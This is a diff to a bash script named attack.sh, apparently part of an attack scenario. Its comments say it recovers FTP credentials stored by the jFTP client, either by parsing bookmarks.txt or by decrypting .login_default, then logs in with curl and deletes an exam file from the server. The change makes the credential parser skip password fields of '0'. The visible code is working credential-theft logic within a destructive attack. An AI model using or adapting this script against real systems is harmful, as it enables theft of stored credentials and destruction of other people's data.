@@ -34,8 +34,9 @@
 #             this script / commit history for that attack in isolation.
 #
 # attack.sh tries bookmarks.txt first. Only if that file is missing, or
-# exists but has no FTP entry with an actual (non-empty, non-"<%hidden%>")
-# password, does it fall back to decrypting .login_default. Either way,
+# exists but has no FTP entry with an actual (non-empty, non-"0",
+# non-"<%hidden%>") password, does it fall back to decrypting
+# .login_default. Either way,
 # once credentials are recovered, it connects with a plain FTP client
 # (curl, not jFTP) and deletes the exam. The server and jFTP client are
 # both already-running, independent processes this script never touches
@@ -112,7 +113,10 @@ try_bookmarks() {
         local host="${fields[1]:-}" user="${fields[2]:-}" \
               pass="${fields[3]:-}" port="${fields[4]:-21}"
         [[ -z "${host}" || -z "${user}" ]] && continue
-        [[ -z "${pass}" || "${pass}" == "${JFTP_HIDDEN_PASSWORD}" ]] && continue
+        # A password field of "0" is treated the same as an empty
+        # password -- jFTP/bookmarks.txt has no real password there, so
+        # this entry is a useless credential and should be skipped too.
+        [[ -z "${pass}" || "${pass}" == "0" || "${pass}" == "${JFTP_HIDDEN_PASSWORD}" ]] && continue
 
         cand_host+=("${host}")
         cand_user+=("${user}")
@@ -122,7 +126,7 @@ try_bookmarks() {
 
     if [[ ${#cand_host[@]} -eq 0 ]]; then
         echo "bookmarks.txt exists but has no FTP entry with a usable" >&2
-        echo "(non-empty, non-\"${JFTP_HIDDEN_PASSWORD}\") password field." >&2
+        echo "(non-empty, non-\"0\", non-\"${JFTP_HIDDEN_PASSWORD}\") password field." >&2
         return 1
     fi
 
